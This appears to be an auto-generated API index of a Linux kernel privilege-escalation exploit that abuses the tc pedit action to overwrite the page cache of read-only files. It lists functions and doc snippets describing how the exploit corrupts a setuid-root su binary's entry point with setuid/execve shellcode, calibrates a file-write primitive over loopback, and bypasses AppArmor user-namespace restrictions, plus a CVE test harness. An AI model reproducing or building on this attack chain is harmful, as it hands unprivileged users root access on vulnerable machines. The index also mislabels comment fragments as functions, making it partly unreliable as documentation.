# API

## packet_edit_meme.c

### find_su (function) `static const char *find_su(void)`
- Defined: `packet_edit_meme.c:57`
- Depends on: `pedit_primitive.h`

### elf_entry_offset (function) `static long elf_entry_offset(int fd)`
- Defined: `packet_edit_meme.c:72`
- Doc: static const char *find_su(void) { struct stat info; int index; for (index = 0; SU_PATHS[index]; index++) { if (stat(SU_
- Depends on: `pedit_primitive.h`

### write_proc_file (function) `static void write_proc_file(const char *path, const char *value)`
- Defined: `packet_edit_meme.c:93`
- Depends on: `pedit_primitive.h`

### corrupt_entry (function) `static int corrupt_entry(int su_fd, long entry_offset)`
- Defined: `packet_edit_meme.c:108`
- Doc: Runs in the unshare()d child: map to uid 0, then write the shellcode over su's * entry, slot by slot, through the page-c
- Depends on: `pedit_primitive.h`

### run_exploit (function) `static int run_exploit(void)`
- Defined: `packet_edit_meme.c:138`
- Depends on: `pedit_primitive.h`

### apparmor_userns_bypass (function) `static void apparmor_userns_bypass(char *self)`
- Defined: `packet_edit_meme.c:211`
- Depends on: `pedit_primitive.h`

### main (function) `int main(int argc, char **argv)`
- Defined: `packet_edit_meme.c:230`
- Depends on: `pedit_primitive.h`

### exec (function) `* and exec()s su, so the setuid bit makes it euid 0 globally and the corrupted * cached page runs the shellcode as real root. * * Shellcode is pure x86_64 syscalls (setuid=105, execve=59) -- the sysca`
- Defined: `packet_edit_meme.c:8`
- Depends on: `pedit_primitive.h`

### close (function) `close(fd);`
- Defined: `packet_edit_meme.c:102`
- Depends on: `pedit_primitive.h`

### perror (function) `perror("unshare");`
- Defined: `packet_edit_meme.c:116`
- Depends on: `pedit_primitive.h`

### snprintf (function) `snprintf(map_line, sizeof(map_line), "0 %u 1", uid);`
- Defined: `packet_edit_meme.c:120`
- Depends on: `pedit_primitive.h`

### fprintf (function) `fprintf(stderr, "[-] no setuid-root su found\n");`
- Defined: `packet_edit_meme.c:152`
- Depends on: `pedit_primitive.h`

### _exit (function) `_exit(0);`
- Defined: `packet_edit_meme.c:185`
- Depends on: `pedit_primitive.h`

### waitpid (function) `waitpid(child, &status, 0);`
- Defined: `packet_edit_meme.c:190`
- Depends on: `pedit_primitive.h`

### execve (function) `execve(su_path, su_argv, NULL);`
- Defined: `packet_edit_meme.c:201`
- Depends on: `pedit_primitive.h`

### execlp (function) `execlp("aa-exec", "aa-exec", "-p", AA_PROFILES[index], "--", self, "--in-profile", (char *)NULL);`
- Defined: `packet_edit_meme.c:223`
- Depends on: `pedit_primitive.h`

## pedit_primitive.c

### request_begin (function) `static void request_begin(int type, int flags)`
- Defined: `pedit_primitive.c:108`
- Depends on: `pedit_primitive.h`

### request_reserve (function) `static void *request_reserve(int length)`
- Defined: `pedit_primitive.c:118`
- Depends on: `pedit_primitive.h`

### request_append (function) `static void request_append(const void *data, int length)`
- Defined: `pedit_primitive.c:126`
- Depends on: `pedit_primitive.h`

### request_attr (function) `static void request_attr(int type, const void *data, int length)`
- Defined: `pedit_primitive.c:131`
- Depends on: `pedit_primitive.h`

### request_attr_str (function) `static void request_attr_str(int type, const char *text)`
- Defined: `pedit_primitive.c:140`
- Depends on: `pedit_primitive.h`

### request_nest_begin (function) `static struct rtattr *request_nest_begin(int type)`
- Defined: `pedit_primitive.c:145`
- Depends on: `pedit_primitive.h`

### request_blob_begin (function) `static struct rtattr *request_blob_begin(int type)`
- Defined: `pedit_primitive.c:157`
- Doc: like request_nest_begin but without NLA_F_NESTED -- for the ematch entry whose * payload is a raw tcf_ematch_hdr followe
- Depends on: `pedit_primitive.h`

### request_nest_end (function) `static void request_nest_end(struct rtattr *attr)`
- Defined: `pedit_primitive.c:165`
- Depends on: `pedit_primitive.h`

### request_send (function) `static int request_send(int allow_enoent)`
- Defined: `pedit_primitive.c:170`
- Depends on: `pedit_primitive.h`

### link_up (function) `static int link_up(int index)`
- Defined: `pedit_primitive.c:193`
- Doc: return -1; received = recv(netlink_fd, reply_buf, sizeof(reply_buf), 0); if (received < 0) return -1; reply = (struct nl
- Depends on: `pedit_primitive.h`

### clsact_delete (function) `static void clsact_delete(int index)`
- Defined: `pedit_primitive.c:225`
- Depends on: `pedit_primitive.h`

### clsact_add (function) `static int clsact_add(int index)`
- Defined: `pedit_primitive.c:239`
- Depends on: `pedit_primitive.h`

### append_pktlen_ematch (function) `static void append_pktlen_ematch(uint32_t threshold)`
- Defined: `pedit_primitive.c:258`
- Doc: request_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL); memset(&msg, 0, sizeof(msg)); msg.tcm_family = AF_UNSPEC; msg.tc
- Depends on: `pedit_primitive.h`

### append_pedit_action (function) `static void append_pedit_action(const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:295`
- Doc: Emit one pedit action entry (kind + selector + per-key extensions) into the * action-list nest that the caller has alrea
- Depends on: `pedit_primitive.h`

### egress_pedit_add (function) `static int egress_pedit_add(int index, const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:342`
- Doc: Install the egress pedit filter. Prefer the basic classifier scoped by a pkt_len ematch (only the data skb is touched, n
- Depends on: `pedit_primitive.h`

### fill_ihl_key (function) `static void fill_ihl_key(struct pedit_key_spec *key)`
- Defined: `pedit_primitive.c:373`
- Doc: action_list = request_nest_begin(TCA_MATCHALL_ACT); } else { request_attr_str(TCA_KIND, "basic"); options = request_nest
- Depends on: `pedit_primitive.h`

### pedit_burst (function) `static int pedit_burst(int src_fd, const struct pedit_key_spec *keys, int key_count)`
- Defined: `pedit_primitive.c:384`
- Doc: sendfile src_fd over a fresh loopback connection, arming `keys` on lo egress * only AFTER the handshake so the corruptio
- Depends on: `pedit_primitive.h`

### calibrate (function) `static int calibrate(void)`
- Defined: `pedit_primitive.c:437`
- Doc: Land a marker at a known key offset and read it back so api_fd_write() can * translate a file offset into the matching p
- Depends on: `pedit_primitive.h`

### setup (function) `int setup(void)`
- Defined: `pedit_primitive.c:487`
- Doc: buf[index_iter + 3] == CALIB_MARK_BYTE) { landed = index_iter; break; } } close(fd); unlink(CALIB_PATH); if (landed < 0)
- Depends on: `pedit_primitive.h`

### api_fd_write (function) `int api_fd_write(int fd, off_t offset, const void *src, size_t size)`
- Defined: `pedit_primitive.c:521`
- Depends on: `pedit_primitive.h`

### memset (function) `memset(request_buf, 0, sizeof(request_buf));`
- Defined: `pedit_primitive.c:111`
- Depends on: `pedit_primitive.h`

### memcpy (function) `memcpy(request_reserve(length), data, length);`
- Defined: `pedit_primitive.c:129`
- Depends on: `pedit_primitive.h`

### ematch (function) `* pkt_len ematch (only the data skb is touched, no out-of-range log spam);`
- Defined: `pedit_primitive.c:339`
- Depends on: `pedit_primitive.h`

### close (function) `close(client_fd);`
- Defined: `pedit_primitive.c:407`
- Depends on: `pedit_primitive.h`

### fcntl (function) `fcntl(client_fd, F_SETFL, O_NONBLOCK);`
- Defined: `pedit_primitive.c:421`
- Depends on: `pedit_primitive.h`

### usleep (function) `usleep(SETTLE_USEC);`
- Defined: `pedit_primitive.c:427`
- Depends on: `pedit_primitive.h`

### fsync (function) `fsync(fd);`
- Defined: `pedit_primitive.c:453`
- Depends on: `pedit_primitive.h`

### unlink (function) `unlink(CALIB_PATH);`
- Defined: `pedit_primitive.c:479`
- Depends on: `pedit_primitive.h`

### link_set_addr (function) `link_set_addr(loopback_index, LOOPBACK_ADDR);`
- Defined: `pedit_primitive.c:499`
- Depends on: `pedit_primitive.h`

### setsockopt (function) `setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));`
- Defined: `pedit_primitive.c:504`
- Depends on: `pedit_primitive.h`

## pedit_primitive.h

### bytes (function) `* * Native write unit is 4 bytes (one pedit key == one u32 via skb_store_bits);`
- Defined: `pedit_primitive.h:3`
- Imported by: `packet_edit_meme.c`, `pedit_primitive.c`, `test_cve.c`

### setup (function) `int setup(void);`
- Defined: `pedit_primitive.h:19`
- Doc: Bring lo up, open the loopback listener, calibrate the skb->file offset * delta. Returns 0 on success, -1 on failure.
- Imported by: `packet_edit_meme.c`, `pedit_primitive.c`, `test_cve.c`

### api_fd_write (function) `int api_fd_write(int fd, off_t offset, const void *src, size_t size);`
- Defined: `pedit_primitive.h:24`
- Doc: Overwrite [offset, offset+size) of fd's page cache with src. fd may be O_RDONLY. size must be a multiple of PEDIT_SLOT a
- Imported by: `packet_edit_meme.c`, `pedit_primitive.c`, `test_cve.c`

## test_cve.c

### make_source (function) `static void make_source(int call, off_t offset, uint8_t *src, size_t size)`
- Defined: `test_cve.c:35`
- Depends on: `pedit_primitive.h`

### create_target (function) `static int create_target(void)`
- Defined: `test_cve.c:45`
- Depends on: `pedit_primitive.h`

### main (function) `int main(void)`
- Defined: `test_cve.c:65`
- Depends on: `pedit_primitive.h`

### close (function) `close(fd);`
- Defined: `test_cve.c:58`
- Depends on: `pedit_primitive.h`

### fsync (function) `fsync(fd);`
- Defined: `test_cve.c:61`
- Depends on: `pedit_primitive.h`

### printf (function) `printf("[-] create %s failed\n", TARGET_PATH);`
- Defined: `test_cve.c:75`
- Depends on: `pedit_primitive.h`
